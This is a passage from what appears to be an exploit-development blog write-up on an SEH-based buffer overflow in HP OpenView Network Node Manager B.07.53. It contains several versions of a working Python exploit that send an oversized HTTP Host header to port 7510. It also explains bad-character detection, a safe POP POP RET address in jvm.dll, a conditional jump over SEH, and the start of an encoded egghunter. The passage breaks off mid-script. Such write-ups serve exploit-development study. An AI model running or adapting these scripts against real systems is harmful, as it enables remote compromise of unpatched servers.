</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;Content-Length: 1048580</span><span class="se">\r\n\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[*] Sending evil HTTP request to HP NNM -B.07.53, buffer length: &quot;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">crash</span><span class="p">)</span>
</span><span class='line'><span class="n">expl</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span> <span class="p">)</span>
</span><span class='line'><span class="n">expl</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&quot;172.16.232.178&quot;</span><span class="p">,</span> <span class="mi">7510</span><span class="p">))</span>
</span><span class='line'><span class="n">expl</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span>
</span><span class='line'><span class="n">expl</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>During crash, the entire buffer was laid in memory as expected.</p>

<p><img src="http://greyshell.github.io/downloads/code/2016/11/hpnnm-B.07.53/verify-seh-offset.png" alt="verify-seh-offset" /></p>

<p>Calculated the length of <code>D</code> buffer = <code>464 bytess</code>. But this buffer length was too small to accommodate the final payload.</p>

<p><img src="http://greyshell.github.io/downloads/code/2016/11/hpnnm-B.07.53/d-block-length.png" alt="length of d block" /></p>

<h2>POP POP RET</h2>

<p>Tried to identify which modules were not compiled with <code>SafeSEH</code> and <code>ASLR</code>.</p>

<ul>
<li><code>!mona nosafesehaslr</code></li>
</ul>


<p>There were plenty of options.</p>

<p><img src="http://greyshell.github.io/downloads/code/2016/11/hpnnm-B.07.53/nosafesehaslr.png" alt="mona output - nosafesehaslr" /></p>

<p>Selected <code>jvm.dll</code> module and picked up a PPR address => <code>0x6D6FA245</code></p>

<ul>
<li><code>!mona seh -m jvm.dll</code></li>
</ul>


<p><img src="http://greyshell.github.io/downloads/code/2016/11/hpnnm-B.07.53/jvm.dll-ppr_address.png" alt="ppr address from jvm.dll" /></p>

<p>Updated the skeleton code in little endian order = <code>\x45\xa2\x6f\x6d</code>.</p>

<p>After that, set up a breakpoint at <code>0x6D6FA245</code> to verify if would possible to land on that address safely during crash.</p>

<p><img src="http://greyshell.github.io/downloads/code/2016/11/hpnnm-B.07.53/breakpoint-0x6d6e394a.png" alt="breakpoint-0x6d6e394a.png" /></p>

<p>But during crash, when the exception was passed to the program, <code>SEH</code> address had been mangled into <code>0xA2BEEF45</code> (little endian order: <code>\x45\xef\xbe\xa2</code>)</p>

<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="c">#!/usr/bin/python </span>
</span><span class='line'>
</span><span class='line'><span class="c"># file name: hpnnm-B.07.53-exploit-v5a.py</span>
</span><span class='line'><span class="c"># author: greyshell</span>
</span><span class='line'><span class="c"># description: choose any ppr address - i.e. 0x6d6fa245  from seh.txt</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="c"># max crash buff length = 3780</span>
</span><span class='line'><span class="c"># nSEH offset = 3305, SEH offset = 3309</span>
</span><span class='line'><span class="n">total_len</span> <span class="o">=</span> <span class="mi">3780</span>
</span><span class='line'>
</span><span class='line'><span class="n">buff_initial</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">3305</span>
</span><span class='line'>
</span><span class='line'><span class="n">nseh</span> <span class="o">=</span> <span class="s">&quot;BBBB&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># 0x6d6fa245: pop eax # pop ebp # ret 0x0c |  {PAGE_EXECUTE_READ} [jvm.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v5.0.140.3 (C:\Program Files\HP OpenView\jre\jreActive\bin\client\jvm.dll</span>
</span><span class='line'><span class="n">seh</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x45\xa2\x6f\x6d</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">buff_last</span> <span class="o">=</span> <span class="s">&quot;D&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">total_len</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">buff_initial</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">nseh</span><span class="p">)</span> <span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">seh</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">crash</span> <span class="o">=</span> <span class="n">buff_initial</span> <span class="o">+</span> <span class="n">nseh</span> <span class="o">+</span> <span class="n">seh</span> <span class="o">+</span> <span class="n">buff_last</span>
</span><span class='line'>
</span><span class='line'><span class="nb">buffer</span> <span class="o">=</span> <span class="s">&quot;GET /topology/homeBaseView HTTP/1.1</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;Host: &quot;</span> <span class="o">+</span> <span class="n">crash</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;Content-Length: 1048580</span><span class="se">\r\n\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[*] Sending evil HTTP request to HP NNM -B.07.53, buffer length: &quot;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">crash</span><span class="p">)</span>
</span><span class='line'><span class="n">expl</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span> <span class="p">)</span>
</span><span class='line'><span class="n">expl</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&quot;172.16.232.178&quot;</span><span class="p">,</span> <span class="mi">7510</span><span class="p">))</span>
</span><span class='line'><span class="n">expl</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span>
</span><span class='line'><span class="n">expl</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p><img src="http://greyshell.github.io/downloads/code/2016/11/hpnnm-B.07.53/ppr_addr_6d6fa245_mangled.png" alt="mangled ppr address" /></p>

<p>It looked like some character translation / filtering had been applied on the buffer. So, it was required to find a bad char friendly <code>PPR</code> address.</p>

<h2>Bad &amp; good chars</h2>

<p>Tried to automate the bad chars detection process using <a href="https://github.com/greyshell/Exploit-Dev/tree/master/autoDetectBadchar">autoDetectBadchar.py</a>.</p>

<blockquote><p><em>Note: During crash, <code>ESP + 0x4c</code> pointed at the 1025-th bytes of the fuzz buffer.</em></p></blockquote>

<p><strong>Algorithm in brief</strong></p>

<ul>
<li>Start the <code>ovas.exe</code> process: <code>ovstop -c ovas &amp;&amp; ovstart -c ovas</code></li>
<li>While sending the buffer, place a <code>test-char</code> at the <code>1025</code>-th position</li>
<li>if (application does not crash) OR (<code>ESP + 0x4c</code> does not have the same char during crash time)

<ul>
<li>then consider that <code>test-char</code> as <code>bad</code> and write it down in <code>badchars.txt</code></li>
</ul>
</li>
<li>else

<ul>
<li>consider that <code>test-char</code> as <code>good</code> then write it down in <code>goodchars.txt</code></li>
</ul>
</li>
<li>Kill the <code>ovas.exe</code> process: <code>taskkill /f /im ovas.exe</code></li>
<li>Verify another <code>test-char</code> from <code>allchar set</code> and repeat the same process</li>
</ul>


<p><img src="http://greyshell.github.io/downloads/code/2016/11/hpnnm-B.07.53/output-bad-char-script.png" alt="detect-bad-char-HPNNM-B.07.53.py output" /></p>

<h2>Safe POP POP RET</h2>

<p>Run <a href="https://github.com/greyshell/Exploit-Dev/tree/master/findingSafeAddress">findingSafeAddress.py</a> to identify all safe <code>PPR</code> address from <code>seh.txt</code>.</p>

<p><img src="http://greyshell.github.io/downloads/code/2016/11/hpnnm-B.07.53/output-finding-safe-ppr.png" alt="finding-safe-ppr.py output" /></p>

<p>Picked up the first address - <code>0x6d6e394a</code> and set up a breakpoint to verify that.</p>

<p><img src="http://greyshell.github.io/downloads/code/2016/11/hpnnm-B.07.53/breakpoint-0x6d6e394a.png" alt="breakpoint at 0x6d6e394a" /></p>

<p>Fired the below exploit code updated with <code>safe PPR</code> address.</p>

<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="c">#!/usr/bin/python </span>
</span><span class='line'>
</span><span class='line'><span class="c"># file name: hpnnm-B.07.53-exploit-v5b.py</span>
</span><span class='line'><span class="c"># author: greyshell</span>
</span><span class='line'><span class="c"># description: choose safe ppr address - 0x6d6e394a from seh.txt/safe-ppr-HPNNM-B.07.53.txt</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="c"># max crash buff length = 3780</span>
</span><span class='line'><span class="c"># nSEH offset = 3305, SEH offset = 3309</span>
</span><span class='line'><span class="n">total_len</span> <span class="o">=</span> <span class="mi">3780</span>
</span><span class='line'>
</span><span class='line'><span class="n">buff_initial</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">3305</span>
</span><span class='line'>
</span><span class='line'><span class="n">nseh</span> <span class="o">=</span> <span class="s">&quot;BBBB&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># 0x6d6e394a : pop ecx # pop ecx # ret 0x08 | asciiprint,ascii,alphanum {PAGE_EXECUTE_READ} [jvm.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v5.0.140.3 (C:\Program Files\HP OpenView\jre\jreActive\bin\client\jvm.dll)</span>
</span><span class='line'><span class="n">seh</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x4a\x39\x6e\x6d</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">buff_last</span> <span class="o">=</span> <span class="s">&quot;D&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">total_len</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">buff_initial</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">nseh</span><span class="p">)</span> <span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">seh</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">crash</span> <span class="o">=</span> <span class="n">buff_initial</span> <span class="o">+</span> <span class="n">nseh</span> <span class="o">+</span> <span class="n">seh</span> <span class="o">+</span> <span class="n">buff_last</span>
</span><span class='line'>
</span><span class='line'><span class="nb">buffer</span> <span class="o">=</span> <span class="s">&quot;GET /topology/homeBaseView HTTP/1.1</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;Host: &quot;</span> <span class="o">+</span> <span class="n">crash</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;Content-Length: 1048580</span><span class="se">\r\n\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[*] Sending evil HTTP request to HP NNM -B.07.53, buffer length: &quot;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">crash</span><span class="p">)</span>
</span><span class='line'><span class="n">expl</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span> <span class="p">)</span>
</span><span class='line'><span class="n">expl</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&quot;172.16.232.178&quot;</span><span class="p">,</span> <span class="mi">7510</span><span class="p">))</span>
</span><span class='line'><span class="n">expl</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span>
</span><span class='line'><span class="n">expl</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>As expected, this time that address did not mangled during crash.</p>

<p><img src="http://greyshell.github.io/downloads/code/2016/11/hpnnm-B.07.53/0x6d6e394a-not-mangled.png" alt="0x6d6e394a did not mangled during crash" /></p>

<p>Passed the exception and landed on the breakpoint.</p>

<p><img src="http://greyshell.github.io/downloads/code/2016/11/hpnnm-B.07.53/land-to-ppr-0x6d6e394a.png" alt="land into 0x6d6e394a" /></p>

<p>Stepped through <code>POP POP RET</code> and finally jumped into <code>nSEH</code>.</p>

<p><img src="http://greyshell.github.io/downloads/code/2016/11/hpnnm-B.07.53/jump-nseh.png" alt="reach to nseh" /></p>

<h2>Jump over SEH</h2>

<p>Initial objective was to write a jump code within <code>4 bytes</code> and jump over <code>SEH</code> to meet <code>D</code> buffer. But short jump (<code>\xeb</code>) was fallen into bad char set.</p>

<p>To overcome the situation, used <a href="https://github.com/greyshell/Exploit-Dev/tree/master/findingSafeInstructions">findingSafeInstructions.py</a> to identify all safe instructions and found that <code>conditional jump</code> instructions are safe to execute.</p>

<p><img src="http://greyshell.github.io/downloads/code/2016/11/hpnnm-B.07.53/safe-opcode-JA.png" alt="finding safe opcode JA" /></p>

<p>Conditional jump <code>JA</code> (<code>\x77</code>) occurs when</p>

<ul>
<li><code>CF = 0</code> and <code>ZF = 0</code></li>
<li>Jump must be within <code>-128 to +127</code> bytes of the next instruction.</li>
</ul>


<p>In this situation, at crash point, it is noticed that <code>ZF = 1</code> and <code>CF = 0</code>.</p>

<p>So in order to make <code>ZF = 0</code> and satisfy the jump condition, decreased <code>EAX</code>.</p>

<ul>
<li><code>DEC EAX</code> => <code>\x48</code> safe char</li>
</ul>


<blockquote><p>Note: Had met the flag condition (<code>ZF = 0</code>) while executing in 1st decrement, 2nd decrement was used just to fill the space.</p></blockquote>

<p>Selected the jump offset = <code>\x04</code> that was also a safe char to jump over <code>SEH</code> and meet the <code>D</code> buffer.</p>

<p>Updated the skeleton code to overwrite <code>nSEH</code> with <code>\x48\x48\x77\x04</code> and set a break point at <code>0x6d6e394a</code>.</p>

<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="c">#!/usr/bin/python </span>
</span><span class='line'>
</span><span class='line'><span class="c"># file name: hpnnm-B.07.53-exploit-v6.py</span>
</span><span class='line'><span class="c"># author: greyshell</span>
</span><span class='line'><span class="c"># description: jump over SEH and meet D buffer block</span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="c"># max crash buff length = 3780</span>
</span><span class='line'><span class="c"># nSEH offset = 3305, SEH offset = 3309</span>
</span><span class='line'><span class="n">total_len</span> <span class="o">=</span> <span class="mi">3780</span>
</span><span class='line'>
</span><span class='line'><span class="n">buff_initial</span> <span class="o">=</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">3305</span>
</span><span class='line'>
</span><span class='line'><span class="c"># 1035FE34   48               DEC EAX</span>
</span><span class='line'><span class="c"># 1035FE35   48               DEC EAX</span>
</span><span class='line'><span class="c"># 1035FE36   77 04            JA SHORT 1035FE59</span>
</span><span class='line'><span class="c"># little edian format: &quot;\x4c\x4c\x77\x04&quot;  ==&gt; bad char friendly</span>
</span><span class='line'><span class="n">nseh</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x48\x48\x77\x04</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="c"># 0x6d6e394a : pop ecx # pop ecx # ret 0x08 | asciiprint,ascii,alphanum {PAGE_EXECUTE_READ} [jvm.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v5.0.140.3 (C:\Program Files\HP OpenView\jre\jreActive\bin\client\jvm.dll)</span>
</span><span class='line'><span class="n">seh</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x4a\x39\x6e\x6d</span><span class="s">&quot;</span>
</span><span class='line'>
</span><span class='line'><span class="n">buff_last</span> <span class="o">=</span> <span class="s">&quot;D&quot;</span> <span class="o">*</span> <span class="p">(</span><span class="n">total_len</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">buff_initial</span><span class="p">)</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">nseh</span><span class="p">)</span> <span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">seh</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'><span class="n">crash</span> <span class="o">=</span> <span class="n">buff_initial</span> <span class="o">+</span> <span class="n">nseh</span> <span class="o">+</span> <span class="n">seh</span> <span class="o">+</span> <span class="n">buff_last</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">=</span> <span class="s">&quot;GET /topology/homeBaseView HTTP/1.1</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;Host: &quot;</span> <span class="o">+</span> <span class="n">crash</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;Content-Type: application/x-www-form-urlencoded</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03</span><span class="se">\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="nb">buffer</span> <span class="o">+=</span> <span class="s">&quot;Content-Length: 1048580</span><span class="se">\r\n\r\n</span><span class="s">&quot;</span>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[*] Sending evil HTTP request to HP NNM -B.07.53, buffer length: &quot;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">crash</span><span class="p">)</span>
</span><span class='line'><span class="n">expl</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span> <span class="p">)</span>
</span><span class='line'><span class="n">expl</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&quot;172.16.232.178&quot;</span><span class="p">,</span> <span class="mi">7510</span><span class="p">))</span>
</span><span class='line'><span class="n">expl</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="nb">buffer</span><span class="p">)</span>
</span><span class='line'><span class="n">expl</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>During crash, breakpoint was hit and after stepping through <code>POP POP RET</code>, control went on the <code>nSEH</code>.</p>

<p>After that it executed all instructions placed on <code>nSEH</code> and finally jumped forward <code>4 bytes</code> and met <code>D</code> buffer.</p>

<p><img src="http://greyshell.github.io/downloads/code/2016/11/hpnnm-B.07.53/jump-over-seh.png" alt="jump over seh" /></p>

<p>At this point, roughly <code>464 bytes</code> space left in <code>D</code> buffer for the final shellcode. But, this space had charset limitation. So, any encoded version of shellcode would not fit here.</p>

<p>However, this <code>464 bytes</code> space can be utilize to implement a <code>stage 1 payload</code> such as <code>egghunter</code> that would connect the <code>stage 2 payload</code> at runtime.</p>

<h2>Egghunter</h2>

<p>Initial plan was to write the egghunter code directly inside <code>D</code> buffer region. But there were many challenges</p>

<ul>
<li><code>D</code> buffer region was suffering from character translation.</li>
<li>It would possible to use metasploit encoder to encode the egghunter eliminating all bad chars but the output payload size would be so large that would not fit inside the <code>D</code> buffer region.</li>
</ul>


<p>Due to this it was required to</p>

<ul>
<li>write a custom encoder using allowed operations - such as <code>AND</code>, <code>SUB</code> and <code>PUSH</code>.</li>
<li>expand the original egghunter reversely after encoded egghunter.</li>
<li>generate <code>ESP</code> address dynamically to bypass <code>ASLR</code> protection.</li>
</ul>


<p>After the jumped over <code>nSEH</code>, it was noticed that <code>ESP</code> points to <code>nSEH</code>. It was just <code>8 bytes</code> away from present <code>program counter</code>.</p>

<p>Due to this it would be easy to pop out that value into <code>EAX</code> and get hold of the program counter to perform further address calculation.</p>

<p>Pointed <code>ESP</code> <code>300 bytes</code> ahead of present <code>program counter</code> and keep the egg marker <code>T00WT00W</code> at the beginning of buffer followed by Initial <code>A</code> buffer = <code>3297 bytes</code>, <code>nSEH</code> = <code>4 bytes</code>, <code>SEH</code> = <code>4 bytes</code>, <code>ESP set up logic</code> = <code>7 bytes</code>, <code>encoded egghunter</code> = <code>208 bytes</code>, remaining final <code>A</code> buffer.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="mi">58</span>               <span class="n">POP</span> <span class="n">EAX</span>
</span><span class='line'><span class="mi">66</span><span class="p">:</span><span class="mo">05</span> <span class="mi">2</span><span class="n">C01</span>       <span class="n">ADD</span> <span class="n">AX</span><span class="p">,</span><span class="mi">12</span><span class="n">C</span>
</span><span class='line'><span class="mi">50</span>               <span class="n">PUSH</span> <span class="n">EAX</span>
</span><span class='line'><span class="mi">5</span><span class="n">C</span>               <span class="n">POP</span> <span class="n">ESP</span>
</span></code></pre></td></tr></table></div></figure>


<p>Replaced the last &ldquo;D&rdquo; buffer block with <code>A</code> buffer block because during runtime, CPU interprets <code>D</code> buffer (<code>\x44</code>) as <code>INC ESP</code>. So it could corrupt the <code>ESP</code> alignment.</p>

<p>But <code>A</code> buffer (<code>\x41</code>) would be interpreted as <code>INC ECX</code> and <code>ECX register</code> was not use anywhere to build the encoder. So it would not break / corrupt any logic. Basically It would act like a <code>NOP-equivalent</code> safe instruction.</p>

<h2>Custom encoder (alphaNumEncoder)</h2>

<p>Used <a href="https://github.com/greyshell/Exploit-Dev/tree/master/alphaNumEncoder">alphaNumEncoder.py</a> - that basically encodes the original egghunter using safe chars and operations - <code>AND</code>, <code>SUB</code>, <code>PUSH</code> and update the skeleton code.</p>

<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
</pre></td><td class='code'><pre><code class='py'><span class='line'><span class="c">#!/usr/bin/python </span>
</span><span class='line'>
</span><span class='line'><span class="c"># file name: hpnnm-B.07.53-exploit-v7.py</span>
</span><span class='line'><span class="c"># author: greyshell</span>
</span><span class='line'><span class="c"># description: encoded egghunter payload using alphaNumEncoder </span>
</span><span class='line'>
</span><span class='line'><span class="kn">import</span> <span class="nn">socket</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">os</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
</span><span class='line'>
</span><span class='line'><span class="c"># max crash buff length = 3780</span>
</span><span class='line'><span class="c"># nSEH offset = 3305, SEH offset = 3309</span>
</span><span class='line'><span class="n">total_len</span> <span class="o">=</span> <span class="mi">3780</span>
</span><span class='line'>
</span><span class='line'><span class="n">egg_marker</span> <span class="o">=</span> <span class="s">&quot;T00WT00W&quot;</span>
</span><span class='line'><span class="n">buff_initial</span> <span class="o">=</span> <span class="n">egg_marker</span> <span class="o">+</span> <span class="s">&quot;A&quot;</span> <span class="o">*</span> <span class="mi">3297</span>
</span><span class='line'><span class="c"># buff_initial = &quot;A&quot; * 3305</span>
